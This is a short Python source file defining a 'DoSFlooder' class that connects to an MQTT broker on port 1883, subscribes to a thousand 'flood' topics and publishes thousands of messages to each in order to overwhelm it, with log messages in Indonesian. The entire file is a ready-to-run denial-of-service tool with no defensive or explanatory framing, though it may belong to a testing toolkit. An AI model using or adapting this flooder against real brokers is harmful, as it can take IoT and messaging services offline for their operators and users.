import paho.mqtt.client as mqtt
import time

class DoSFlooder:
    def __init__(self, broker_ip, username=None, password=None, qos=0, retain=False, delay=0.005, logger=None):
        self.broker_ip = broker_ip
        self.username = username
        self.password = password
        self.qos = qos
        self.retain = retain
        self.delay = delay
        self.logger = logger

    def log(self, message):
        if self.logger:
            self.logger(message)

    def run(self, topic_count=1000, messages_per_topic=3000):
        import paho.mqtt.client as mqtt, time
        client = mqtt.Client()
        if self.username and self.password:
            client.username_pw_set(self.username, self.password)

        try:
            client.connect(self.broker_ip, 1883, 60)
            client.loop_start()
            topics = []

            for i in range(topic_count):
                topic = f"flood/topic/{i}"
                client.subscribe(topic)
                topics.append(topic)
                time.sleep(self.delay)

            self.log(f"[✓] Subscribed {topic_count} topics.")
            time.sleep(1)

            for topic in topics:
                for j in range(messages_per_topic):
                    payload = f"FLOOD_{topic}_{j}"
                    client.publish(topic, payload, qos=self.qos, retain=self.retain)

            client.loop_stop()
            client.disconnect()
            self.log("[✓] Publish Flood selesai.")
        except Exception as e:
            self.log(f"[!] Subscribe Flood gagal - {e}")

